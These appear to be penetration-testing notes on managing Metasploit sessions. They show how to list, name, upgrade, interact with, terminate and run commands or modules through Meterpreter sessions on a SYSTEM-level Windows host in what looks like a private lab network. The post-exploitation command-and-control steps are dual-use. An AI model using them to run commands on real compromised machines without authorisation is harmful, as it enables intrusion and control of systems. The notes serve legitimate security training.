# 03 - Sessions

Search Tag(s): #metasploit-framework #command-and-control

## 3.1 - Help Menu

```
msf > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -c, --command <command>              Run a command on the session given with -i, or all
    -C, --meterpreter-command <command>  Run a Meterpreter Command on the session given with -i, or all
    -d, --list-inactive                  List all inactive sessions
    -h, --help                           Help banner
    -i, --interact <id>                  Interact with the supplied session ID
    -k, --kill <id>                      Terminate sessions by session ID and/or range
    -K, --kill-all                       Terminate all sessions
    -l, --list                           List all active sessions
    -n, --name <id> <name>               Name or rename a session by ID
    -q, --quiet                          Quiet mode
    -s, --script <script>                Run a script or module on the session given with -i, or all
    -S, --search <filter>                Row search filter.
    -t, --timeout <seconds>              Set a response timeout (default: 15)
    -u, --upgrade <id>                   Upgrade a shell to a meterpreter session on many platforms
    -v, --list-verbose                   List all active sessions in verbose mode
    -x, --list-extended                  Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6
```

## 3.2 - List Active Session IDs

```
msf > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DEFALT  10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)

Upgrade the regular shell to meterpreter for enhanced post exploitation activities
```

## 3.3 - Upgrade Command Shell To Meterpreter Session

```
msf > sessions -u <session_ID>
```

## 3.4 - Name Session ID

```
msf > sessions -i 1 -n win10
[*] Session 1 named to win10
```

## 3.5 - Active Session IDs

```
msf > sessions -l

Active sessions
===============

  Id  Name   Type                     Information                   Connection
  --  ----   ----                     -----------                   ----------
  1   win10  meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DEFALT  10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)
```

## 3.6 - Interact Session ID

```
msf > sessions -1
[*] Starting interaction with win10...


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session win10...
```

## 3.7 - Print More Info Of Session ID

```
msf > sessions -v

Active sessions
===============

  Session ID: 1
        Name: win10
        Type: meterpreter windows
        Info: NT AUTHORITY\SYSTEM @ DEFALT
      Tunnel: 10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)
         Via: exploit/multi/script/web_delivery
   Encrypted: Yes (AES-256-CBC)
        UUID: e9b905d567404039/x64=2/windows=1/2022-05-14T21:23:58Z
     CheckIn: 60s ago @ 2022-05-14 18:09:35 -0400
  Registered: No

msf > sessions -x

Active sessions
===============

  Id  Name   Type                     Checkin?  Enc?  Local URI  Information                   Connection
  --  ----   ----                     --------  ----  ---------  -----------                   ----------
  2   win10  meterpreter x64/windows  57s ago   Y     ?          NT AUTHORITY\SYSTEM @ DEFALT  10.0.2.4:445 -> 10.0.2.15:50035  (10.0.2.15)
```

## 3.8 - Terminate Session ID

```
msf > sessions -k 1
[*] Killing the following session(s): 1
[*] Killing session 1
[*] 10.0.2.15 - Meterpreter session win10 closed.

msf > sessions -K
```

## 3.9 - Execute Commands Pass Through Session ID(s)

### 3.9.1 - Command Sessions

```
msf > sessions -s <module> <-i <session_ID> | all>

msf > sessions -c <shell_command> <-i <session_ID> | all>
```

### 3.9.2 - Meterpreter Sessions

```
msf > sessions -s <module | meterpreter_script> <-i <session_ID> | all>

msf > sessions -C <meterpreter_command> <-i <session_ID> | all>
```

---
## References

- [Metasploit Unleashed: Msfconsole Commands](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/)